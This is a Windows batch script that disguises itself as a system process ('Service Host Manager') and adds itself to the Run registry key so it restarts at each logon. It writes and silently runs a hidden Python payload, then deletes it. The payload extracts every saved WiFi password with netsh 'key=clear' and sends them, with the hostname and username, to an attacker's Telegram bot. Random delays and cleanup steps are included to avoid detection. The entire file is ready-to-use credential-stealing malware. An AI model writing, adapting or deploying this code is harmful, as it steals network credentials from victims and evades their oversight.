@echo off
title Windows System Process
color 07
setlocal enabledelayedexpansion

REM === ULTIMATE STEALTH DISGUISE ===
set "syspid="
for /f "tokens=2" %%i in ('tasklist /fi "imagename eq svchost.exe" /fo csv ^| findstr /v "Info"') do (
    set "syspid=%%~i"
    goto :pidFound
)
:pidFound
if defined syspid (
    title Service Host Manager [!syspid!]
) else (
    title System Idle Process
)

REM === MINIMAL VISIBLE ACTIVITY ===
echo [5%%] Initializing system components...
ping -n 1 127.0.0.1 >nul 2>&1

REM === CONFIGURATION - UPDATE THESE ===
set "TELEGRAM_BOT_TOKEN=bot_token_here"
set "TELEGRAM_CHAT_ID=chat_id_here"

REM === STEALTH PERSISTENCE ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystemService" /t REG_SZ /d "cmd /c start /min \"\" \"%~f0\"" /f >nul 2>&1

REM === OPTIMIZED PYTHON CHECK ===
where python >nul 2>&1 
if errorlevel 1 (
    where py >nul 2>&1
    if errorlevel 1 (
        exit /b 0
    )
)

REM === CREATE ULTRA-OPTIMIZED PYTHON SCRIPT ===
(
echo import subprocess
echo import re
echo import requests
echo import os
echo import sys
echo import time
echo import random
echo import ctypes
echo import socket
echo from concurrent.futures import ThreadPoolExecutor, as_completed
echo from datetime import datetime
echo.
echo # === ULTIMATE STEALTH ===
echo def enable_ultimate_stealth^(^):
echo     try:
echo         # Hide console window completely
echo         ctypes.windll.user32.ShowWindow^(ctypes.windll.kernel32.GetConsoleWindow^(^), 0^)
echo         # Remove from taskbar
echo         ctypes.windll.user32.SetWindowLongA^(ctypes.windll.kernel32.GetConsoleWindow^(^), -20, 0x80^)
echo         # Disable quick edit mode
echo         kernel32 = ctypes.windll.kernel32
echo         kernel32.SetConsoleMode^(kernel32.GetStdHandle^(-10^), 128^)
echo     except:
echo         pass
echo.
echo # === ROBUST NETWORK DISCOVERY ===
echo def discover_wifi_profiles^(^):
echo     for attempt in range^(3^):
echo         try:
echo             result = subprocess.run^(
echo                 ["netsh", "wlan", "show", "profiles"],
echo                 capture_output=True,
echo                 text=True,
echo                 timeout=12,
echo                 creationflags=0x08000000
echo             ^)
echo             if result.returncode == 0:
echo                 profiles = re.findall^(r"All User Profile\s*: (.+)", result.stdout^)
echo                 return [p.strip^(^) for p in profiles] if profiles else []
echo         except:
echo             time.sleep^(random.uniform^(0.5, 1.5^)^)
echo     return []
echo.
echo # === SECURE PASSWORD EXTRACTION ===
echo def extract_wifi_password^(profile^):
echo     try:
echo         # Random delay to avoid detection
echo         time.sleep^(random.uniform^(0.1, 0.4^)^)
echo         result = subprocess.run^(
echo             ["netsh", "wlan", "show", "profile", profile, "key=clear"],
echo             capture_output=True,
echo             text=True,
echo             timeout=10,
echo             creationflags=0x08000000
echo         ^)
echo         password_match = re.search^(r"Key Content\s*: (.+)", result.stdout^)
echo         password = password_match.group^(1^).strip^(^) if password_match else "No password"
echo         security_match = re.search^(r"Authentication\s*: (.+)", result.stdout^)
echo         security = security_match.group^(1^).strip^(^) if security_match else "Unknown"
echo         return {
echo             "ssid": profile,
echo             "password": password,
echo             "security": security,
echo             "success": True
echo         }
echo     except Exception as e:
echo         return {
echo             "ssid": profile,
echo             "password": "Extraction failed",
echo             "security": "Unknown",
echo             "success": False
echo         }
echo.
echo # === HIGH-PERFORMANCE PARALLEL PROCESSING ===
echo def extract_all_passwords_parallel^(profiles^):
echo     if not profiles:
echo         return []
echo     with ThreadPoolExecutor^(max_workers=4^) as executor:
echo         results = list^(executor.map^(extract_wifi_password, profiles^)^)
echo     return results
echo.
echo # === INTELLIGENT TELEGRAM COMMUNICATION ===
echo def send_telegram_message_intelligent^(message, chat_id, token^):
echo     max_length = 4000  # Conservative limit
echo     if len^(message^) ^<= max_length:
echo         return send_single_message^(message, chat_id, token^)
echo.
echo     # Split into logical sections
echo     lines = message.split^('\n'^)
echo     current_part = ""
echo     part_number = 1
echo     parts = []
echo.
echo     for line in lines:
echo         if len^(current_part + line^) ^> max_length:
echo             if current_part:
echo                 parts.append^(current_part^)
echo                 current_part = line + '\n'
echo             else:
echo                 # Line too long, force split
echo                 parts.append^(line[:max_length]^)
echo         else:
echo             current_part += line + '\n'
echo.
echo     if current_part:
echo         parts.append^(current_part^)
echo.
echo     total_parts = len^(parts^)
echo     for i, part in enumerate^(parts^):
echo         part_header = f"*PART {i+1}/{total_parts}*\n\n"
echo         if not send_single_message^(part_header + part, chat_id, token^):
echo             return False
echo         if i ^< total_parts - 1:
echo             time.sleep^(0.3^)  # Rate limiting
echo.
echo     return True
echo.
echo def send_single_message^(text, chat_id, token^):
echo     try:
echo         response = requests.post^(
echo             f"https://api.telegram.org/bot{token}/sendMessage",
echo             data={
echo                 "chat_id": chat_id,
echo                 "text": text,
echo                 "parse_mode": "Markdown",
echo                 "disable_web_page_preview": True
echo             },
echo             timeout=15
echo         ^)
echo         return response.status_code == 200
echo     except:
echo         return False
echo.
echo # === PROFESSIONAL REPORT GENERATION ===
echo def generate_professional_report^(wifi_data^):
echo     hostname = socket.gethostname^(^)
echo     username = os.environ.get^('USERNAME', 'Unknown'^)
echo     computer_name = os.environ.get^('COMPUTERNAME', 'Unknown'^)
echo     timestamp = datetime.now^(^).strftime^('%%Y-%%m-%%d %%H:%%M:%%S'^)
echo.
echo     successful_networks = [w for w in wifi_data if w['success']]
echo     networks_with_passwords = [w for w in successful_networks if w['password'] not in ["No password", "Extraction failed"]]
echo.
echo     message = "*🔐 WiFi Security Report*\n"
echo     message += "*⏰ Time:* {}\n".format^(timestamp^)
echo     message += "*💻 Host:* {} ({})\n".format^(hostname, computer_name^)
echo     message += "*👤 User:* {}\n".format^(username^)
echo     message += "*📊 Summary:* {}/{} networks with passwords\n\n".format^(len^(networks_with_passwords^), len^(wifi_data^)^)
echo.
echo     message += "*📡 Network Details:*\n"
echo     for i, network in enumerate^(successful_networks, 1^):
echo         status = "🔐" if network['password'] not in ["No password", "Extraction failed"] else "🔓"
echo         password_display = network['password'] if network['password'] not in ["No password", "Extraction failed"] else "Open Network"
echo         message += "{}. {} *{}*\n".format^(i, status, network['ssid']^)
echo         message += "   🔑 *Password:* `{}`\n".format^(password_display^)
echo         message += "   🛡️ *Security:* {}\n\n".format^(network['security']^)
echo.
echo     return message
echo.
echo # === MAIN EXECUTION ENGINE ===
echo def main_execution_engine^(^):
echo     enable_ultimate_stealth^(^)
echo.
echo     token = "%TELEGRAM_BOT_TOKEN%"
echo     chat_id = "%TELEGRAM_CHAT_ID%"
echo.
echo     # Validate configuration
echo     if token == "YOUR_ACTUAL_BOT_TOKEN_HERE" or chat_id == "YOUR_ACTUAL_CHAT_ID_HERE":
echo         return
echo.
echo     # Discover and extract WiFi networks
echo     profiles = discover_wifi_profiles^(^)
echo     if not profiles:
echo         return
echo.
echo     wifi_results = extract_all_passwords_parallel^(profiles^)
echo     report = generate_professional_report^(wifi_results^)
echo     send_telegram_message_intelligent^(report, chat_id, token^)
echo.
echo if __name__ == "__main__":
echo     main_execution_engine^(^)
) > "%temp%\~wifi_scan.tmp"

REM === ULTRA-SILENT BACKGROUND EXECUTION ===
start /B /low python "%temp%\~wifi_scan.tmp"

REM === INSTANT AND COMPLETE CLEANUP ===
timeout /t 1 /nobreak >nul 2>&1
del "%temp%\~wifi_scan.tmp" >nul 2>&1

REM === DECOY CLEAN EXIT ===
exit
